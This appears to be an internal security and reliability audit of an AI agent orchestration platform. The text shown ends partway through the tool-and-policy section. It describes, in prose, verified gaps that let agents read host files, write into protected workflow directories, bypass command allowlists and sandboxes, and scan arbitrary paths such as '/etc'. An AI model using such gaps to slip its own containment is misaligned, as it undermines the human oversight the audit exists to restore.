# CRR2906 — Full Production-Readiness Audit v1

**Date:** 2026-08-05
**Scope:** Complete architecture, security, scalability, and reliability audit of the Gridiron AI Workforce Operating System.
**Method:** Read-only source-code audit. No code was changed while producing this report. Several findings (marked "Verified by execution") were confirmed by actually running the real policy/validation functions from this repo against exploit inputs, not just reading code and assuming behavior.

This file consolidates **two audit passes**:
- **Part 1** — a prior pass that reviewed and fixed 8 issues originally flagged by Codex (rate limiting, JWT enforcement, admin bootstrap, dependency CVEs, docker-compose security, CI gates). Those fixes were implemented and verified (tests run, builds passing) and are **not** re-audited here.
- **Part 2** — a brand-new, read-only audit of every remaining subsystem (21 phases, labeled A–U in the original brief), performed by 8 parallel specialist passes. **Nothing in Part 2 has been fixed yet — it is audit only.**

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scores](#2-scores)
3. [Part 1 — Already Fixed & Verified (Prior Pass)](#3-part-1--already-fixed--verified-prior-pass)
4. [Part 2 — Full System Audit](#4-part-2--full-system-audit)
   - [4.1 Phase A+B — Agent Runtime + LangGraph](#41-phase-ab--agent-runtime--langgraph)
   - [4.2 Phase C — Repository Intelligence](#42-phase-c--repository-intelligence)
   - [4.3 Phase D+E — Planner + Multi-Agent Orchestration](#43-phase-de--planner--multi-agent-orchestration)
   - [4.4 Phase F — Memory System](#44-phase-f--memory-system)
   - [4.5 Phase G+H+I — Tool System + Repository Workspace + Policy Engine (CRITICAL)](#45-phase-ghi--tool-system--repository-workspace--policy-engine-critical)
   - [4.6 Phase J+K+L — Mission Control + Event Bus + Artifact Storage](#46-phase-jkl--mission-control--event-bus--artifact-storage)
   - [4.7 Phase M+N+O — Observability + Database + Queue System](#47-phase-mno--observability--database--queue-system)
   - [4.8 Phase P+Q+R+S+T — Model Router + Scalability + Performance + Disaster Recovery + AI-Specific Security](#48-phase-pqrst--model-router--scalability--performance--disaster-recovery--ai-specific-security)
5. [Consolidated Release Blockers](#5-consolidated-release-blockers)
6. [Remaining Technical Debt](#6-remaining-technical-debt)
7. [Recommended Next Milestones](#7-recommended-next-milestones)

---

## 1. Executive Summary

This is a genuinely sophisticated system — real LangGraph orchestration with Postgres checkpointing, real human-in-the-loop approval gates, real cost/token accounting, real circuit breakers, real prompt-injection mitigation on some paths, real per-agent tool scoping. The engineering is not superficial, and a large fraction of what was audited works correctly and is well-reasoned (the codebase's own comments show a team that iterates and documents its own prior bugs honestly).

But the tool/policy layer — the part that decides what an AI agent is actually allowed to touch on your host — has **five independently-exploitable critical holes**, confirmed by running real exploit inputs against the real policy functions in this repo's own venv. Several non-coder agents can currently read arbitrary host files, write outside their assigned worktree (including directly into `.github/workflows/`, which CLAUDE.md explicitly says is permanently protected), or run unsandboxed commands that bypass the allowlist meant to constrain them. Separately, there is no database backup mechanism anywhere in the codebase, and the RQ/priority-queue infrastructure described in `docker-compose.yml` is completely disconnected from real task dispatch.

**Bottom line: not production-ready.** Not because the architecture is wrong, but because the boundary between "AI agent" and "your host machine" has real, exploitable gaps today.

---

## 2. Scores

| Dimension | Score | Rationale |
|---|---|---|
| **Production Readiness** | **3.5 / 10** | Core orchestration is real; the security perimeter around agent tool execution is not. Cannot deploy against untrusted/adversarial repo content today. |
| **Architecture** | **7 / 10** | Genuinely well-designed patterns (checkpointing, verification contracts, capability registry, condensation). Undermined by inconsistent application of those same patterns (e.g. one correct `write_file` implementation exists right next to three broken ones). |
| **Security** | **2.5 / 10** | 5 critical, execution-verified tool-layer bypasses; secrets are freely readable; SSRF on `fetch_url`; command-chaining gap on unsandboxed allowlisted tools. |
| **Scalability** | **3 / 10** | Single-instance-only today: 7 singleton background loops with no leader election, in-memory chat/SSE state requiring sticky sessions, small hardcoded DB pool vs. the app's own 20-concurrent-run design target. |
| **Reliability** | **4.5 / 10** | Real orphan-run recovery and heartbeats, but a genuine task-ownership race (no row locking anywhere), a crash-and-stick planner failure mode, and unbounded checkpoint/log table growth. |
| **AI Runtime Score** | **6 / 10** | The actual agent-loop engineering (retries, stall detection, circuit breakers, checkpoint replay safety, verification contracts) is the strongest part of the system — let down by what those agents are permitted to touch. |

---

## 3. Part 1 — Already Fixed & Verified (Prior Pass)

These were audited, fixed, and re-verified (tests run, builds passing) in the session before this one. **Not re-audited in Part 2.**

| # | Item | Status |
|---|---|---|
| 1 | Rate limiting inactive (no per-route decorators, only a loose global default) | ✅ Fixed — login/setup capped at 10/min, task/epic create+run+restart at 60/min, agent dispatch + chat at 30/min |
| 2 | JWT auth not enforced in production | ✅ Fixed — `_require_secure_production_auth` validator hard-fails startup if JWT/RBAC disabled or legacy header allowed in production |
| 3 | Default admin password (`gridiron123`) | ✅ Fixed — production startup refuses to boot with default/short password |
| 4 | Unauthenticated `/setup` bootstrap endpoint could create admin | ✅ Fixed — returns 404 in production; still has a narrow TOCTOU race in non-prod (documented, not fixed) |
| 5 | Docker sandbox falls back to host execution when Docker unavailable | ✅ Fixed — now fails closed (`SandboxUnavailableError`) instead of silently running on host; documented that the shipped `docker-compose.yml` gives the backend container no Docker access |
| 6 | 36 known frontend CVEs (1 critical, 18 high) | ✅ Fixed — `pnpm audit` now reports **0 vulnerabilities** (Next.js was already on 15.5.21; remaining CVEs in vitest/vite/esbuild/sharp/minimatch/undici/postcss resolved via version bumps + workspace overrides) |
| 7 | `docker-compose.yml` Postgres/Redis publicly exposed with dev credentials | ✅ Fixed — bound to `127.0.0.1` only; password parameterized via `${POSTGRES_PASSWORD}` |
| 8 | `/health` leaked raw exception text | ✅ Already fixed prior to this session — verified still correct |
| — | `POST /api/auth/refresh` referenced in a docstring but didn't exist | ✅ Implemented for real — renews JWT + httponly cookie for an already-valid session |
| — | `pnpm-workspace.yaml` had a literal placeholder (`sharp: set this to true or false`) instead of a boolean | ✅ Fixed — invalid config that silently skipped sharp's native build script |
| — | Next.js 15 async-`params` breaking change not applied to `epics/[id]/page.tsx` | ✅ Fixed — matched the codebase's own established `useParams()` pattern |
| — | CI's `pnpm audit` step was informational/non-blocking | ✅ Flipped to a real blocking gate now that it's clean |

Full backend test suite: **3853 passed, 0 failed**. Frontend: lint/typecheck/tests/build all clean.

---

## 4. Part 2 — Full System Audit

Everything below is **new** — read-only findings, nothing implemented yet.

---

### 4.1 Phase A+B — Agent Runtime + LangGraph

**Scope:** `backend/app/agents/`, `backend/app/pipeline/`, `backend/app/fleet/`, `backend/app/db/repository.py`, `backend/app/api/tasks.py`, `main.py`.

#### Verified Strengths

1. **Bounded retries everywhere** — `base.py:149`, `base_graph.py:1993,2008` all hard-stop. A real prior bug is documented and fixed in `manager.py:217-225`: the outer subtask loop used to reuse the same retry constant an inner static-check loop used, producing up to `max_retries²` real LLM attempts. `manager_max_subtask_retries` was introduced specifically to fix this.
2. **Real orphan-run/crash detection** — `failure_ladder.py:209-287` compares `agent_runs.last_heartbeat_at` against a threshold every 5 minutes, transitions stale `running` rows to `failed`, routes through `escalate()`. Heartbeats written from `base_graph.py:1555-1567`, throttled. A real timezone bug (naive datetimes reinterpreted as system-local by asyncpg) was found and fixed via non-UTC-environment testing.
3. **Sophisticated, correctly-reasoned `interrupt()`/`resume()`** — `pipeline/graph.py:87-134` (PM→Architect→Decomposer→human_review), backed by a real `AsyncPostgresSaver`, resumed via `Command(resume=...)`. `chat_agent.py:1-40` documents a real engineering finding: LangGraph replays a node's *entire body* on resume, so every side-effecting tool call was deliberately made its own graph node (verified via a targeted reproduction script per the code's own comment).
4. **Tool-batch replay safety** — `base_graph.py:1430-1767` processes exactly one pending tool call per graph invocation, closing a documented hazard where a mid-batch crash + resume would replay already-completed real side effects.
5. **Verification contract is adversarial-aware** — `VerificationConfig` overrides self-reported `submit_*` fields with facts proven by real tool runs; `blocking_until` hard-refuses a tool call until a prerequisite is verified.
6. **Unified policy engine** — `guardrails.py` used to be an independently-drifting, weaker reimplementation of `policy/engine.py` (missing worktree-boundary checks, several deny patterns). Now a thin delegator — one source of truth.
7. **Real cost tracking** — `manager.py:450-451,529-530,597-598` accumulate real `tokens_in`/`tokens_out` from every dispatched agent's actual final state; pre-run estimates and post-run actuals use the same formula.
8. **Clean async task lifecycle** — `main.py:527-550` starts 7 background loops and explicitly cancels + awaits every one on shutdown.
9. **Durable background-process tracking** — `bg_process_registry.py` writes every `run_background` subprocess to a JSON registry, swept and SIGTERM'd at startup.
10. **Bounded, thread-safe in-process caches** — `LessonStore` and `MetricsCollector` are both capacity-bounded with locks, not unbounded leaks.
11. **Model tiering enforced** — `ModelRouter.route()` always wins over any caller-passed model.
12. **Anthropic circuit breaker on every LLM call** — single chokepoint (`_call_anthropic`), prevents a real provider outage from being hammered by ~76 independently-retrying agents.

#### Confirmed Weaknesses

**1. Task-ownership race — two workers/requests can double-dispatch the same task — Severity: High**
- Root cause: `transition_task` (`db/repository.py:209-222`) is a plain read-check-write with no row lock (`SELECT ... FOR UPDATE`), no compare-and-swap `UPDATE ... WHERE status = :expected`, no unique constraint. Confirmed zero uses of `FOR UPDATE`/`SKIP LOCKED` anywhere in the codebase.
- Risk: Two near-concurrent `POST /run` requests both read `status="pending"`, both pass the check, both transition and both get dispatched. They then race on `create_worktree(task_id)` — keyed only by `task_id`, doing `git worktree add -b <branch>` concurrently for the same path/branch — real git-level corruption risk.
- Files: `backend/app/db/repository.py:209-222`, `backend/app/api/tasks.py:189-230`.
- Proposed fix: Atomic `UPDATE dev_tasks SET status=:new WHERE id=:id AND status IN (:allowed) RETURNING id`; 0 rows affected → 409. No new lock table needed.

**2. No parallel fan-out — `Send()`/`asyncio.gather` never used — Severity: Medium**
- Root cause: `run_manager`'s subtask loop is a strict sequential `for` loop. Zero occurrences of `Send(` or `asyncio.gather` anywhere in `backend/app`.
- Risk: `subtask_slot`/`agent_run_slot` semaphores (`max_concurrent_subtasks_per_epic=5` default) were clearly built to allow concurrency, but nothing ever calls them concurrently. Epic wall-clock time scales linearly with subtask count even when subtasks are independent.
- Files: `backend/app/agents/manager.py:269-757`.
- Proposed fix: Group topological order into dependency "waves," dispatch each wave with `asyncio.gather`, bounded by the existing semaphore.

**3. Budget enforcement is detective, not preventive — Severity: Medium**
- Root cause: `BudgetManager.check_run`/`check_daily` are called exactly once, **after** the graph has already fully finished (the code's own comment: "a run that already finished can't be un-run").
- Risk: A single run can already exceed `max_tokens_per_agent_run` (100,000) or `cost_budget_daily_usd` ($25) before `BudgetExceeded` is ever raised — the money is already spent.
- Files: `backend/app/agents/base_graph.py:2605-2625`.
- Proposed fix: Add a periodic token/time check inside the `call_llm` node loop, not only after the graph fully drains.

**4. Daily cost budget is per-process, in-memory, resets on restart — Severity: Medium**
- Root cause: `check_daily` sums from `MetricsCollector`'s in-process `deque(maxlen=capacity)` — not a DB query.
- Risk: `cost_budget_daily_usd` is effectively "since this process last restarted," not a real calendar-day limit — silently resets/fragments across restarts or multiple worker processes.
- Files: `backend/app/fleet/budget_manager.py:132-145`, `backend/app/fleet/metrics.py:264-266`.
- Proposed fix: Back `check_daily` with a DB aggregate query (`SUM(cost) FROM agent_runs WHERE started_at >= today`).

**5. LangGraph Postgres checkpoint tables have no retention/cleanup — unbounded growth — Severity: Medium-High**
- Root cause: `retention.py`'s `_RETAINED_TABLES` covers `task_logs`/`agent_runs`/`artifacts`/`memory_embeddings` — **not** `checkpoints`/`checkpoint_blobs`/`checkpoint_writes`. Every `run_agent_graph()` call generates a **fresh `uuid4` `trace_id`** used as the checkpointer `thread_id` — confirmed no caller ever passes a stable one.
- Risk: Every dev/QA/review dispatch, every retry, every subtask, every epic permanently creates a brand-new LangGraph thread in Postgres that is never cleaned up. Grows unbounded over the deployment's life.
- Files: `backend/app/services/retention.py:33-37`, `backend/app/agents/base_graph.py:2261,2552`.
- Proposed fix: Add a retention sweep for checkpoint tables, or reuse a stable per-subtask-attempt id and delete its checkpoint(s) on completion.

**6. Worker-agent checkpointing exists but is never used to actually resume a crashed run — Severity: Low-Medium**
- Root cause: Only `pipeline/graph.py` (planner) and `chat_agent.py` (interactive session) ever resume from a paused thread. Worker-agent graphs (`base_graph.py`) always invoke fresh with a new `thread_id` each call.
- Risk: If the process dies mid-worker-agent-run, recovery is: orphan sweep marks it `failed` → outer retry loop starts an **entirely new run from scratch**. Checkpointing today buys crash-forensics/salvage, not resume.
- Files: `backend/app/agents/base_graph.py:2553,2758-2790`.
- Proposed fix: Document as "forensic salvage, not resume" (accurate today), or thread a stable id through for real resume.

**7. Unbounded per-epic semaphore dict — Severity: Low**
- Root cause: `_subtask_sems: dict[str, asyncio.Semaphore] = {}` (`pipeline/concurrency.py:20`) is never cleared after an epic completes.
- Files: `backend/app/pipeline/concurrency.py:20,55-59`.
- Proposed fix: Evict on epic completion, or use a `WeakValueDictionary`/LRU cap.

**8. Schema validation on `submit_*` payloads is non-blocking — Severity: Low**
- Root cause: `jsonschema.validate` failures only log a warning and stash `_validation_warning` — never reject or force retry.
- Files: `backend/app/agents/base_graph.py:1644-1655`.
- Proposed fix: On validation failure, feed the error back to the model as a tool-result and require re-submission.

**9. ~12 scoped bash tool handlers bypass the Docker sandbox entirely — Severity: Low-Medium**
- Root cause: Handlers like test-runner, load-test, dependency-audit, infra-dry-run call `subprocess.run(shell=True)` directly, protected only by allowlist+regex — not container isolation. Self-documented as a partial rollout in the code.
- Files: `backend/app/agents/tools.py:854-945`.
- Proposed fix: Wire the remaining handlers through `run_sandboxed` for consistency.

**10. "Retention" is a soft flag, not deletion — DB rows grow forever — Severity: Low**
- Root cause: `_archive_table` only ever does `UPDATE ... SET archived=true` — never `DELETE`. Module comment admits a true move to cheaper storage is out of scope.
- Files: `backend/app/services/retention.py:40-73`.

**11. Orphaned-process sweep doesn't verify process identity before killing — Severity: Low**
- Root cause: `sweep_orphaned_processes` sends `SIGTERM` to every PID in the registry with no cmdline/start-time verification.
- Files: `backend/app/fleet/bg_process_registry.py:102-126`.
- Risk: PID recycling between crash and next startup could kill an unrelated process.

**12. CLAUDE.md's "every agent action logged to `task_logs`" claim doesn't match reality — informational — Severity: Low**
- Root cause: `task_logs` is only written at coarse pipeline milestones; per-tool-call actions instead go through `activity_stream`/the `events` table — an equivalent but different mechanism than what the rule literally names.

---

### 4.2 Phase C — Repository Intelligence

**Scope:** `backend/app/repo_tools/`, `backend/app/api/repo.py`, `backend/app/mcp/server.py`, `backend/app/db/models.py`, relevant migrations.

#### Verified Strengths

1. **Tree-sitter AST parsing is real and correct** — accurate line ranges, correctly handles both `identifier` and dotted `attribute` superclass nodes.
2. **Incremental indexing is genuinely wired**, and a documented bug was fixed — `_do_reindex` now correctly calls `scanner.merge_indexes()` to reunite the partial (changed-only) result with the previously cached full index; the code's own docstring documents the prior bug where this merge was missing.
3. **Endpoints correctly reuse the maintained in-memory index** rather than re-scanning on every call.
4. **Weekly reindex loop delegates correctly** rather than duplicating logic, fixing two documented prior bugs (discarded results, stale captured repo_path).
5. **File folding for large files is genuinely wired into `read_file`** — real signature-only structural view via tree-sitter, not a stub.
6. **DB persistence of the index is real and idempotent** — delete-then-reinsert per `repo_path` in a single transaction.
7. **Cross-file call graph and PageRank ranking is a legitimate, non-trivial implementation** — aider-derived heuristics reduce false-positive edges from common short identifiers, correctly falls back to uniform ranking when PageRank doesn't converge.
8. **pgvector HNSW indexes exist where vector columns are actually used** (`memory_embeddings`, `versioned_lessons`).

#### Confirmed Weaknesses

**1. Repo-code semantic search / pgvector pipeline is completely disconnected — dead schema, dead pipeline, brute-force fallback — Severity: High**
- Root cause: Migration `001_initial_schema.py` creates a proper `code_embeddings` table with a `vector(1536)` column, but no SQLAlchemy model exists for it anywhere, nothing writes or reads it, and `generate_embeddings()` is never called from any production code path. `semantic_search()` performs a pure-Python, non-vectorized cosine similarity loop over an `embeddings` argument that no caller ever populates (always `[]` in practice). The MCP tool literally named `semantic_search` doesn't call the embeddings module at all — it only does keyword scoring, despite its description claiming otherwise. The only test is gated behind a `requires_voyage` marker in `tests/pending/`, not part of normal CI.
- Risk: Any documentation/prompt/agent reasoning assuming "semantic/vector search over the codebase" is active is wrong — silently degrades to keyword substring matching everywhere, always.
- Files: `backend/app/repo_tools/embeddings.py:29-105`, `context_builder.py:63,93-96`, `mcp/server.py:71-85,185-210`, `migrations/versions/001_initial_schema.py:191-205`.
- Proposed fix: Either wire it up for real (add a `CodeEmbedding` model, persist rows on reindex, add an HNSW index, rewrite `semantic_search()` as a real `ORDER BY embedding <=> :query` query), or drop the orphaned table/migration and fix the MCP tool's description.

**2. Cross-file call graph is fully rebuilt from disk on every context/architecture request — no caching, synchronous, blocks the event loop — Severity: High**
- Root cause: `build_context()` calls `build_cross_file_graph(index)` unconditionally on every uncached call, which re-reads and re-parses every file via `ast.parse` regardless of the scanner's own hash-skip determination, then runs full PageRank. None of this is wrapped in `asyncio.to_thread` anywhere (confirmed the codebase uses it extensively elsewhere for CPU-bound work, just not here).
- Risk: On a large repo, every `GET /api/repo/context` call — which agents call routinely — re-parses the entire codebase and blocks the single-threaded event loop for the whole duration, freezing every other concurrent request (health checks, other users' requests, event delivery) on that worker process.
- Files: `backend/app/repo_tools/context_builder.py:103`, `cross_file_graph.py:183-260`, `api/repo.py:408-517,355-391`.
- Proposed fix: Wrap in `asyncio.to_thread()` at every call site; cache the built graph alongside the index instead of recomputing per-request.

**3. Full-file reads for hashing on every "incremental" reindex; no `.gitignore`/size guard — Severity: Medium**
- Root cause: `index_repository()` does `os.walk` over the entire tree every call and reads full file bytes to hash **before** checking `known_hashes` — the incremental optimization only skips the parse, not the disk read. No `.gitignore` parsing, no per-file size cap.
- Files: `backend/app/repo_tools/scanner.py:229-267`.
- Proposed fix: Use `os.stat()` mtime+size as a cheap pre-filter before reading bytes; add a max-file-size guard.

**4. MCP server accepts an unvalidated `repo_path` override on every tool call — Severity: Medium**
- Root cause: `_get_repo()` returns `params.get("repo_path")` with no validation that it's within an allowed root, flowing directly into an unrestricted `os.walk`.
- Risk: Any MCP client able to specify `repo_path` (e.g. `/etc`, `../`) can make the server scan and return path/symbol-name info from arbitrary directories on the host.
- Files: `backend/app/mcp/server.py:104-105`.
- Proposed fix: Validate any caller-supplied `repo_path` resolves under a configured allowlist before use.

**5. In-memory repo cache/state is process-local — inconsistent under multiple workers — Severity: Medium**
- Root cause: `_active_repo_path`, `_cached_index`, `_context_cache` are plain module-level globals with no shared backing store.
- Risk: Running more than one worker process means each has independent, potentially inconsistent cache state; a reindex on worker A doesn't update worker B.
- Files: `backend/app/api/repo.py:41-50`, `context_builder.py:19-38`.

**6. `Symbol`/`CallEdge` tables missing indexes on hot columns — Severity: Low**
- Files: `backend/migrations/versions/001_initial_schema.py:165-189`.

**7. `persistence.py` docstring inaccurately claims no unique constraints exist — Severity: Low (informational)**
- `indexed_files` does have `uq_indexed_files_repo_file`; only `symbols`/`call_edges` don't.

---

### 4.3 Phase D+E — Planner + Multi-Agent Orchestration

**Scope:** `backend/app/agents/pm.py,architect.py,decomposer.py`, `backend/app/pipeline/`, `backend/app/fleet/`.

#### Verified Strengths

1. **Real human-in-the-loop plan approval via LangGraph `interrupt()`** — genuine StateGraph (PM→Architect→Decomposer→human_review), compiled with `interrupt_before`, state persisted via `AsyncPostgresSaver`, resumed via `Command(resume=...)`.
2. **Approval endpoints are RBAC-gated and state-machine-guarded** — require_approver, status checks before transition, audit events published.
3. **Real concurrency enforcement** — genuine `asyncio.Semaphore`-backed slots with bounded waits raising `SlotAcquisitionTimeout`, actually called from `manager.py`, not decorative.
4. **Real heartbeats + orphan recovery** — throttled DB writes, periodic sweep transitions stale runs to failed.
5. **Registry-driven agent selection is real, not a stub** — `FleetManager.select()` genuinely queries the capability/agent registries, scores candidates, and its result is actually consumed in `manager.py` (overrides the naive fallback when the registry-selected agent differs and is healthy).
6. **Cross-epic file-conflict guard is wired and was bug-fixed** — halts an epic on file overlap with another running epic; a prior silent-no-op bug (schema mismatch) was found and fixed.
7. **Stall detection and bounded retries are real** — 3-consecutive-tool-free-turn stall limit, retries bounded against config.
8. **Prompt-injection mitigation on tool output** — untrusted content wrapped in an explicit delimiter with suspicious-pattern flagging.
9. **Structured submit tools with declared JSON Schemas** — PM/Architect/Decomposer each declare real Anthropic tool schemas with required fields and enums; acceptance criteria/risks are real structured fields, not free text.

#### Confirmed Weaknesses

**1. Planner output schema validation is enforced only as a soft warning, not a gate — Severity: High**
- Root cause: On `ValidationError`, the code only logs a warning and stashes `_validation_warning` — never rejects, blocks `submitted=True`, or forces retry. Worse, `_run_quality_gate()`'s `passed` boolean expression **excludes** `policy:schema_valid` entirely — a schema-invalid submission can still yield `gate.passed=True`.
- Risk: Malformed/incomplete LLM output (e.g. missing required field) flows through as "successful." Planner nodes only check `submitted` truthiness, never inspect `_validation_warning` or gate status. Downstream code that indexes into the malformed dict can crash (see #2).
- Files: `backend/app/agents/base_graph.py:1641-1655,1227-1292`, `pm.py:171-175`, `architect.py:194-200`, `decomposer.py:178-194`.
- Proposed fix: Fold `policy:schema_valid` into the `passed` computation; have planner nodes check gate status before advancing stage.

**2. A malformed Decomposer submission can crash the background pipeline task and leave it permanently stuck in "planning" — Severity: High**
- Root cause: `save_subtasks()` does `st["title"]` — a hard `KeyError` if absent, even though the schema only *softly* requires it (see #1). `Subtask.title` is a non-nullable DB column with no default. `launch_planning_pipeline()`'s broad exception handler logs and alerts but **never transitions the task out of `"planning"`**.
- Risk: Task status remains `"planning"` forever. `restart_task` explicitly refuses tasks in `("planning","coding","testing")` (409) — **no self-service recovery path exists.** Requires manual DB intervention.
- Files: `backend/app/db/repository.py:521-534`, `api/agents.py:139-250`, `api/tasks.py:233-298,260-270`.
- Proposed fix: Validate/coerce subtasks defensively before persistence; have the exception handler transition the task to a terminal `blocked`/`failed` status so it becomes restartable.

**3. `max_concurrent_subtasks_per_epic` is a real semaphore but has no real concurrent caller — subtasks run strictly sequentially — Severity: Medium**
- Root cause: `run_manager()` dispatches subtasks via a plain sequential `for` loop with inline `await` — no `asyncio.gather`/`create_task`/`TaskGroup` anywhere. The semaphore (capacity 5) is acquired/released once per subtask but never actually gates concurrent execution since nothing calls it concurrently.
- Risk: No functional bug, but a real documentation/implementation mismatch — tuning the setting has zero effect on throughput; epics with many subtasks take the full serial sum of latencies instead of the intended fan-out speedup.
- Files: `backend/app/agents/manager.py` (subtask loop, ~line 269-393), `pipeline/concurrency.py:92-106`.

**4. No real task queue — dispatch is via FastAPI `BackgroundTasks`, and the built `QueueAdapter`/RQ backend is explicitly unwired — Severity: Medium**
- (See also Section 4.7's Critical finding #11 — same root issue, different angle.) `queue_adapter.py`'s own docstring states plainly every real task-launch call site dispatches via `BackgroundTasks.add_task()`, not `queue().enqueue()`. `QUEUE_BACKEND=rq` has zero effect on real dispatch today.
- Risk: No queue fairness beyond FIFO wakeup order of semaphore waiters; no durable, restart-surviving job queue.
- Files: `backend/app/pipeline/queue_adapter.py:1-28,192-212`, `api/tasks.py` (all launch call sites).

**5. `pipeline/dispatcher.py`'s capability lookup result is dead/discarded, module has zero live callers — Severity: Low-Medium**
- Root cause: `pick_agent_by_tag()` returns a resolved `agent_name`, but `dispatch_subtask()`'s actual execution branch ignores it entirely, dispatching purely on `subtask_type`. Confirmed via grep: `dispatch_subtask` has no callers anywhere — the live path is `manager.py`.
- Files: `backend/app/pipeline/dispatcher.py:42-164`.
- Proposed fix: Remove as superseded, or fix it to honor `agent_name` and give it a real caller.

**6. Autonomous capability-based agent selection is real but narrow — most of the ~76-agent roster is dispatched by explicit name — Severity: Low**
- Root cause: `FleetManager.select()` is only invoked from one place, choosing between exactly two capabilities (backend/frontend dev). The other ~70 specialized agents are dispatched by explicit name via `POST /api/specialized-agents/{agent_name}/run` — the caller picks the agent, the system doesn't route to it based on task content.
- Files: `backend/app/fleet/fleet_manager.py:65-165`, `agents/manager.py:283-330`, `api/specialized_agents.py:43-168`.

**7. `_requires_human_approval` flag computed per-submission is largely inert for planning agents — Severity: Low**
- Root cause: Computed on every `submit_*` call, but PM/Architect/Decomposer never read it back to actually pause anything — the only real approval gate is the fixed `human_review_node`, unconditional regardless of this flag.
- Risk: A reviewer has no surfaced indicator that a given plan's quality gate failed vs. passed cleanly.
- Files: `backend/app/agents/base_graph.py:1689-1691`, `pm.py`, `architect.py:179`, `decomposer.py:164`, `api/tasks.py:469-483`.

---

### 4.4 Phase F — Memory System

**Scope:** `backend/app/memory/` (store.py, hooks.py, versioned_memory.py), `backend/app/models/chat.py`, `backend/app/agents/chat_agent.py`, `backend/app/agents/base_graph.py`.

#### Verified Strengths

1. **Composite memory scoring is real and correctly wired** — blends similarity, recency (exponential half-life decay), reuse, importance, verified, sourced from config, spliced into all 5 `query_*` functions' `ORDER BY`.
2. **Deduplication is real and enforced on the write path** — `_find_near_duplicate()` runs before every embed call, gated by config threshold (default 0.97), strengthens the existing row instead of inserting a duplicate.
3. **Staleness/aging buckets are computed, not dead config** — real analytics function, exposed via API.
4. **Retrieval time / analytics instrumentation is real** — recorded after every real DB round-trip, bounded deque, rolled up by a real analytics function.
5. **LessonStore (in-process, keyword-overlap) FIFO + dedup both genuinely implemented** — Jaccard token overlap check, genuine FIFO eviction.
6. **Versioned lesson lifecycle is real, not a stub** — draft/merge/promote/archive lifecycle with human-gated promotion, real LLM-based merge on conflict.
7. **Retention loop is real and covers memory_embeddings** — archives (not deletes) on its own cadence, `archived=false` genuinely enforced on every read (previously cosmetic, now fixed).
8. **Repo-scoping (cross-project bleed prevention) is implemented and threaded through real call sites** — not just the write path; correctly keeps legacy/unscoped rows visible while preventing cross-repo leakage of newly-scoped rows.
9. **HNSW indexes exist on both vector columns.**
10. **Chat/agent context condensation is real, not silent truncation** — actual LLM summarization of message history, gated on token budget, pushes SSE events.

#### Confirmed Weaknesses

**1. Composite scoring defeats the HNSW index — every ranked memory query is an unindexed scan over all live rows — Severity: High**
- Root cause: pgvector's HNSW index only accelerates `ORDER BY embedding <=> :vec` directly. All 5 `query_*` functions instead `ORDER BY` a larger composite arithmetic expression with the distance operator buried inside — Postgres cannot use the index for this sort.
- Risk: This system is explicitly designed for ~68 agents continuously writing memories. As the table grows from hundreds to hundreds of thousands of rows, every retrieval degrades from a sub-millisecond ANN lookup to an O(n) scan+sort — exactly the cost the HNSW index was built to eliminate.
- Files: `backend/app/memory/store.py:137-143` (used across all 5 query functions).
- Proposed fix: Two-stage retrieval — first an index-accelerated `ORDER BY embedding <=> :vec LIMIT k*N` overfetch, then apply the composite formula only over that small candidate set.

**2. Memory dedup has a TOCTOU race — concurrent writes can still produce duplicates — Severity: Medium**
- Root cause: `_find_near_duplicate()` does a `SELECT`, and if none found, the caller proceeds to a separate `INSERT`/commit — no `SELECT ... FOR UPDATE`, no advisory lock, no unique/exclusion constraint.
- Risk: Two agents completing near-identical work concurrently can both pass the dedup check before either commits, producing duplicate rows anyway — diluting reuse-count signal.
- Files: `backend/app/memory/store.py:158-211`.
- Proposed fix: Postgres advisory lock keyed on `(category, repo_id)`, or `SELECT ... FOR UPDATE` spanning check-then-insert.

**3. Chat session restore path bypasses token-budget condensation on the very first turn after recovery — Severity: High**
- Root cause: `load_history_from_db()` has **no LIMIT** — loads every message row for the session, unbounded, whenever an in-memory session is missing (restart/eviction). The condense check is gated on an in-memory `_tokens_in > 0` counter that resets to 0 for every freshly-constructed `ChatAgent` — exactly the scenario a restore triggers.
- Risk: `context_token_budget` defaults to only 8000 tokens. Any chat session surviving a restart, on its very first resumed turn, sends the **entire unbounded raw history** to the LLM — precisely the scenario budget protection matters most. Can produce a context-window-exceeded error or unbudgeted cost spike.
- Files: `backend/app/models/chat.py:98-118`, `backend/app/agents/chat_agent.py:520,2628,2659`.
- Proposed fix: Run the condense check unconditionally on the first call of a restored session, or bound `load_history_from_db()`'s query itself.

**4. `memory_recency_half_life_days` has no positivity guard — a misconfigured 0 silently zeroes all retrieval — Severity: Low**
- Root cause: No `gt=0` constraint; used as a divisor in the composite score expression. A `0` value causes a division-by-zero caught by a broad `except Exception` (logged, returns `[]`) — **all 5 memory retrieval paths silently go dark fleet-wide** on a config typo.
- Files: `backend/app/config.py:302-305`.
- Proposed fix: Add `gt=0` constraint so a bad value fails fast at startup, per CLAUDE.md's own "never a silent default" rule.

**5. `memory_search` tool trusts an LLM-supplied `repo_id` rather than deriving it from session/task state — Severity: Low (currently mitigated, fragile)**
- Root cause: Unlike every other read path, the tool handler takes `repo_id` straight from the tool call's JSON input — the LLM itself chooses which repo's memory to read. Safe today only because it's wired into exactly one fleet-wide-curation agent.
- Risk: Not exploitable today, but a scoping foot-gun if ever attached to a per-repo agent — could read another repo/tenant's scoped memories.
- Files: `backend/app/agents/tools.py:12261-12283`.

---

### 4.5 Phase G+H+I — Tool System + Repository Workspace + Policy Engine (CRITICAL)

**Scope:** `backend/app/agents/tools.py`, `backend/app/repo_tools/worktree.py`, `backend/app/policy/`, `backend/app/services/git_service.py`.

**Methodology note:** every weakness below was traced through the actual source and, where feasible, **executed against the real `app.policy.engine` / `app.agents.tools` code** in the repo's own venv to confirm exploitability.

#### Verified Strengths

1. Sandbox fails closed (already fixed prior session — not re-audited here).
2. **Real per-agent tool scoping, not "every agent gets every tool"** — ~40 distinct `make_*_handlers()` factories, each agent wired to its own handler dict and matching real Anthropic tool-use schema.
3. **Real prompt-injection defense exists** for `web_search`/`read_file`/`read_files` — genuinely wired into the main tool-execution loop.
4. **Git remote/host allowlisting is real and correctly ordered** — no `shell=True` in `git_service.py`, `git_push` validates the *actual configured remote URL* (not just the URL an agent claims) against the allowlist.
5. **No deploy-credential code path found** — matches CLAUDE.md's claim.
6. **`check_command`'s denylist is genuinely broad**, normalizes `rm` flag variants, shows a documented history of real regex bugs being tested against execution.
7. **Structured, append-only audit log infrastructure exists and is well-designed** (see weakness on coverage, though).
